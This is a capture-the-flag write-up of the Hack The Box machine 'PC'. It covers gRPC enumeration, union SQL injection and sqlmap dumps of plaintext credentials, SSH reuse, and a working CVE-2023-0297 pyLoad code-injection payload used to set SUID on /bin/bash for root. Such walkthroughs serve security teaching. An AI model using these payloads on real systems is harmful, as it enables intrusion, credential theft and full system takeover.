---
title: "HTB PC"
draft: false
description: ""
categories: ["HTB"]
tags: [ "htb-easy","gRPC", "sqlite", "SQLi", "CVE-2023-0297" ]
date: 2023-10-08T10:02:38+05:30
summary: ""
---

> PC is an easy Linux box with only one open port, aside from SSH, which hosts a gRPC application. One of the RPC services within this application has a vulnerability that can be exploited for SQL injection, leading to the disclosure of credentials for the user 'sau'. These credentials are also reused for SSH access, granting a shell. Further enumeration reveals an internal server running on port 8000, powered by Cheroot version 8.6.0. This specific version of Cheroot is susceptible to CVE-2023-0297, enabling the execution of commands as the user running Cheroot. By leveraging this vulnerability, it is possible to escalate privileges to root.

---
## Enumeration
---

### Open Ports

```bash
nmap -p22,50051 -sV -sC -T4 -Pn -oA 10.10.11.214 10.10.11.214
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-27 14:18 EDT
Nmap scan report for 10.10.11.214
Host is up (0.25s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 91bf44edea1e3224301f532cea71e5ef (RSA)
|   256 8486a6e204abdff71d456ccf395809de (ECDSA)
|_  256 1aa89572515e8e3cf180f542fd0a281c (ED25519)
50051/tcp open  unknown
```

### port 50051, gRPC

Connecting to port 50051 using netcat doesn't return anything significant. The headers are compressed and returned in binary format. Additionally, the timeout suggests it expects an `HTTP/2` request, indicating it might be a gRPC service, given the default port.

```bash
> nc -v 10.129.206.168 50051
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 10.129.206.168:50051.
?��?�� �?@Did not receive HTTP/2 settings before handshake timeout
```

gRPC is a Remote Procedure Call framework that relies on HTTP/2 and supports bi-directional communication, unlike REST which only a supports request-response. There are many tools like [grpcurl](https://github.com/fullstorydev/grpcui) or [grpc-client-cli](https://github.com/vadimi/grpc-client-cli), but I ended up using [evans](https://github.com/ktr0731/evans/) since it has a interactive repl option. Additionally, with gRPC reflections enabled, it can list available services and request types.

```bash
> evans --reflection --host 10.129.206.168 --verbose repl
evans: load global config from /home/abraxas/.config/evans
...snip...
...snip...
  ______
 |  ____|
 | |__    __   __   __ _   _ __    ___
 |  __|   \ \ / /  / _. | | |_ \  / __|
 | |____   \ V /  | (_| | | | | | \__ \
 |______|   \_/    \__,_| |_| |_| |___/

 more expressive universal gRPC client


SimpleApp@10.129.206.168:50051> show package
+-------------------------+
|         PACKAGE         |
+-------------------------+
|                         |
| grpc.reflection.v1alpha |
+-------------------------+

SimpleApp@10.129.206.168:50051> show service
+-----------+--------------+---------------------+----------------------+
|  SERVICE  |     RPC      |    REQUEST TYPE     |    RESPONSE TYPE     |
+-----------+--------------+---------------------+----------------------+
| SimpleApp | LoginUser    | LoginUserRequest    | LoginUserResponse    |
| SimpleApp | RegisterUser | RegisterUserRequest | RegisterUserResponse |
| SimpleApp | getInfo      | getInfoRequest      | getInfoResponse      |
+-----------+--------------+---------------------+----------------------+

```

Setting the service to be used as SimpleApp (`service SimpleApp`), I can call a listed RPC. The `getInfo` request type requires an authorization header called `token` to be set.

```bash
SimpleApp@10.129.206.168:50051> call getInfo
id (TYPE_STRING) => 123
evans: map[grpc-client:[evans]]
evans: request:
{
  "id": "123"
}
{
  "message": "Authorization Error.Missing 'token' header"
}
```

The `RegisterUser` RPC allows to register an user, and I can login using `LoginUser`. However, `LoginUser` doesn't not show the response headers, these can be shown with the `--enrich` option.

```bash
SimpleApp@10.129.206.168:50051> call RegisterUser
username (TYPE_STRING) => abraxas
password (TYPE_STRING) => abraxas
evans: map[grpc-client:[evans]]
evans: request:
{
  "username": "abraxas",
  "password": "abraxas"
}
{
  "message": "Account created for user abraxas!"
}

SimpleApp@10.129.206.168:50051> call LoginUser --enrich
username (TYPE_STRING) => abraxas
password (TYPE_STRING) => abraxas
evans: map[grpc-client:[evans]]
evans: request:
{
  "username": "abraxas",
  "password": "abraxas"
}
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

{
  "message": "Your id is 139."
}

token: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWJyYXhhcyIsImV4cCI6MTY5NDI5MDI2Mn0.Jk4mRPhFr07sdAWF80Q4i42T3NOuGr2V3WuEO39Hm2s'

code: OK
number: 0
message: ""
```

The `getInfo` RPC requires the `token` header to be set, and an id parameter, both of which are found in the response from the Login RPC

```bash
SimpleApp@10.129.206.168:50051> header token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWJyYXhhcyIsImV4cCI6MTY5NDI5MDI2Mn0.Jk4mRPhFr07sdAWF80Q4i42T3NOuGr2V3WuEO39Hm2s

SimpleApp@10.129.206.168:50051> call getInfo
id (TYPE_STRING) => 139
evans: map[grpc-client:[evans] token:[eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWJyYXhhcyIsImV4cCI6MTY5NDI5MDI2Mn0.Jk4mRPhFr07sdAWF80Q4i42T3NOuGr2V3WuEO39Hm2s]]
evans: request:
{
  "id": "139"
}
{
  "message": "Will update soon."
}
```

The response doesn't give any new information, but it does give a new input field.

---
## Foothold
---


In order to understand how the request is being sent, need to proxy the getInfo RPC through burp. Since I couldn't proxy `evan`, switched to a different tool called [grpcui](https://github.com/fullstorydev/grpcui). This opens an WebUI on the browser, which can in turn can easily be proxied through burp

```bash
> grpcui -use-reflection -plaintext 10.129.68.2:50051
gRPC Web UI available at http://127.0.0.1:53937/
```

Using the same process as before, can login via the `LoginUser` RPC.

![grpc-ui](./images/grpc-ui.png)

Invoking the `getInfo` RPC using the token header metadata and id from `LoginUser`.

![grpcui-getInfo](./images/grpcui-getInfo.png)


### Union based SQL injection

`getInfo` RPC request captured in burp suite using the id and token header. The `id` input field is controlled by the user, so it could be susceptible to injection vulnerabilities.

![grpc-burp-proxy](./images/grpc-burp-proxy.png)

SQL injected on the `id` parameter can be confirmed using the payload `514 or true --`.

![sqli-id-confirmation](./images/sqli-id-confirmation.png)

Additionally, I can exploit SQL Union injection on the id field, since `11` is reflected in the response message.

![sqli-id-union](./images/sqli-id-union.png)

Further utilizing the union injection, can confirm the backend database as SQlite version 3.31.1

![sqli-dbs-sqlite](./images/sqli-dbs-sqlite.png)

Dumping all tables in the database from the `sqlite_master` table.
```bash
514 union select group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' --
```

![sqli-dump-tables](./images/sqli-dump-tables.png)

The column names from the `accounts` table can be dumped using the payload,
```bash
514 union SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('accounts'); --
```

![sqli-dump-columns](./images/sqli-dump-columns.png)

Using the `group_concat()` can dump all usernames from the accounts table
```bash
514 union select group_concat(username) from accounts --
```

![sqli-hex-accounts-username](./images/sqli-hex-accounts-username.png)

Similarly, the passwords can be dumped using the payload, `514 union select group_concat(password) from accounts --`

![sqli-hex-accounts-password](./images/sqli-hex-accounts-password.png)


### SQLi using sqlmap

The sqli exploitation can also be automated using sqlmap.

```bash
sqlmap -r sqli.req --risk 3 --level 3 -p id --dbms=SQlite --batch --tables
[15:53:47] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[15:53:47] [INFO] fetching tables for database: 'SQLite_masterdb'
<current>
[2 tables]
+----------+
| accounts |
| messages |
+----------+

```

Similarly, the accounts tables can be dumped by appending `-T accounts --dump` to the previous command. The accounts table contains the password for the user, `sau`.

```bash
> sqlmap -r sqli.req --risk 3 --level 3 -p id --batch -T accounts --dump

[15:54:27] [INFO] fetching entries for table 'accounts'
Database: <current>
Table: accounts
[2 entries]
+------------------------+----------+
| password               | username |
+------------------------+----------+
| admin                  | admin    |
| HereIsYourPassWord1431 | sau      |
+------------------------+----------+

```

Nothing  relevant in the `messages` table.

```bash
[15:55:10] [INFO] fetching entries for table 'messages'
Database: <current>
Table: messages
[1 entry]
+----+----------------------------------------------+----------+
| id | message                                      | username |
+----+----------------------------------------------+----------+
| 1  | The admin is working hard to fix the issues. | admin    |
+----+----------------------------------------------+----------+

```


### Shell as sau

The newly acquired credentials for `sau` also work on SSH.

```bash
> pc sau:HereIsYourPassWord1431@10.10.11.214
[15:56:02] Welcome to pwncat 🐈!
[15:56:05] 10.10.11.214:22: registered new host w/ db
(local) pwncat$
(remote) sau@pc:/home/sau$ id
uid=1001(sau) gid=1001(sau) groups=1001(sau)
```


---
## Privilege Escalation to root
----

Found the user flag in `sau`'s home directory.

```bash
(remote) sau@pc:/home/sau$ ls -al user.txt
-rw-r----- 1 root sau    33 May 27 18:25 user.txt
```

Unfortunately, `sau` does not have any sudo privileges.

```bash
(remote) sau@pc:/home/sau$ sudo -l
[sudo] password for sau:
Sorry, user sau may not run sudo on localhost.
```


Looking for open ports in an attempt to search for new services on the machine, found port 8000 listening only on localhost.

```bash
(remote) sau@pc:/home/sau$ ss -antlp
State                 Recv-Q                Send-Q                               Local Address:Port                                 Peer Address:Port                Process
LISTEN                0                     5                                        127.0.0.1:8000                                      0.0.0.0:*
LISTEN                0                     128                                        0.0.0.0:9666                                      0.0.0.0:*
LISTEN                0                     4096                                 127.0.0.53%lo:53                                        0.0.0.0:*
LISTEN                0                     128                                        0.0.0.0:22                                        0.0.0.0:*
LISTEN                0                     4096                                             *:50051                                           *:*
LISTEN                0                     128                                           [::]:22                                           [::]:*
```

It seems the service running on port 8000 is a pure python HTTP sever powered by Cheroot version 8.6.0 and used by `pyCherry`. Additionally the title of the page seems to be `pyLoad`.

```bash
(remote) sau@pc:/home/sau$ curl -i 127.0.0.1:8000 -L
HTTP/1.1 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 275
Location: /login?next=http%3A%2F%2F127.0.0.1%3A8000%2F
Vary: Accept-Encoding
Date: Sun, 10 Sep 2023 19:56:52 GMT
Server: Cheroot/8.6.0

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 13500
Vary: Accept-Encoding
Date: Sun, 10 Sep 2023 19:56:52 GMT
Server: Cheroot/8.6.0

...snip...
...snip...
<title>Login - pyLoad </title>
...snip...
```

Searching for running processes named pyload, found a python script.

```bash
(remote) sau@pc:/home/sau$ ps aux | grep [p]yload
root        1043  0.0  2.0 1231064 80760 ?       Ssl  18:24   0:05 /usr/bin/python3 /usr/local/bin/pyload
(remote) sau@pc:/home/sau$ file /usr/local/bin/pyload
/usr/local/bin/pyload: Python script, ASCII text executable
(remote) sau@pc:/home/sau$ cat /usr/local/bin/pyload
#!/usr/bin/python3
# -*- coding: utf-8 -*-
import re
import sys
from pyload.__main__ import main
if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
```

Port forwarding the port 8000, using the SSH connection, `127.0.0.1:8000` redirects to a pyload page
```bash
ssh> -L 8000:127.0.0.1:8000
```

![pyload-login-page](./images/pyload-login-page.png)

Searching for exploits for Cheroot version 8.6.0 and pyLoad found [CVE-2023-0297](https://attackerkb.com/topics/4G0gkUrtoR/cve-2023-0297) and the corresponding [disclosure](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad).

> pyLoad versions prior to 0.5.0b3.dev31 are vulnerable to Python code injection due to the pyimport functionality exposed through the js2py library. An unauthenticated attacker can issue a crafted POST request to the flash/addcrypted2 endpoint to leverage this for code execution. pyLoad by default runs two services, the primary of which is on port 8000 and can not be used by external hosts. A secondary “Click ‘N’ Load” service runs on port 9666 and can be used remotely without authentication.

When testing this particular instance of Cheroot, it returns a 500 with a response, `Could not decrypt key`, meaning its vulnerable. Additionally, it created the said file owned by root, which means I can execute commands as root by exploiting CVE-2023-0297.

```bash
(remote) sau@pc:/home/sau$ curl -i -s -k -X POST \
> --data-binary $'jk=pyimport%20os;os.system(\"touch%20/tmp/pwnd_abraxas\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
> http://127.0.0.1:8000/flash/addcrypted2
HTTP/1.1 500 INTERNAL SERVER ERROR
Content-Type: text/html; charset=utf-8
Content-Length: 21
Access-Control-Max-Age: 1800
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: OPTIONS, GET, POST
Vary: Accept-Encoding
Date: Sun, 10 Sep 2023 20:11:03 GMT
Server: Cheroot/8.6.0

Could not decrypt key

(remote) sau@pc:/home/sau$ ls -la /tmp/pwnd_abraxas
-rw-r--r-- 1 root root 0 Sep 10 20:11 /tmp/pwnd_abraxas
```

Created a bash script which set the SUID bit on `/bin/bash`.

```bash
(remote) sau@pc:/home/sau$ echo 'chmod 6777 /bin/bash' > /tmp/escalate.sh
(remote) sau@pc:/home/sau$ curl -i -s -k -X POST \
> --data-binary $'jk=pyimport%20os;os.system(\"bash%20/tmp/escalate.sh\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
> http://127.0.0.1:8000/flash/addcrypted2
HTTP/1.1 500 INTERNAL SERVER ERROR
Content-Type: text/html; charset=utf-8
Content-Length: 21
Access-Control-Max-Age: 1800
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: OPTIONS, GET, POST
Vary: Accept-Encoding
Date: Sun, 10 Sep 2023 20:11:03 GMT
Server: Cheroot/8.6.0

Could not decrypt key
```

With the SUID bit set on the bash binary, it can be run in privileged mode to get effective root privileges.

```bash
(remote) sau@pc:/home/sau$ ls -la /bin/bash
-rwsrwsrwx 1 root root 1183448 Apr 18  2022 /bin/bash
(remote) sau@pc:/home/sau$ bash -p
(remote) root@pc:/home/sau# id
uid=1001(sau) gid=1001(sau) euid=0(root) egid=0(root) groups=0(root),1001(sau)
(remote) root@pc:/home/sau# ls -la /root/root.txt
-rw-r----- 1 root root 33 Sep 10 19:49 /root/root.txt
```

There's also a [auto exploit](https://github.com/JacobEbben/CVE-2023-0297) script available on GitHub.

**Pwned!!**

<!-- ![Pwned](https://i.imgur.com/GlQz8WI.png) -->

---


# Related Links

- https://github.com/ktr0731/evans
- https://github.com/fullstorydev/grpcui
- [CVE-2023-0297 | AttackerKB](https://attackerkb.com/topics/4G0gkUrtoR/cve-2023-0297)
- [bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad: CVE-2023-0297: The Story of Finding Pre-auth RCE in pyLoad](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad)
- [JacobEbben/CVE-2023-0297: Unauthenticated Remote Code Execution in PyLoad <0.5.0b3.dev31](https://github.com/JacobEbben/CVE-2023-0297)
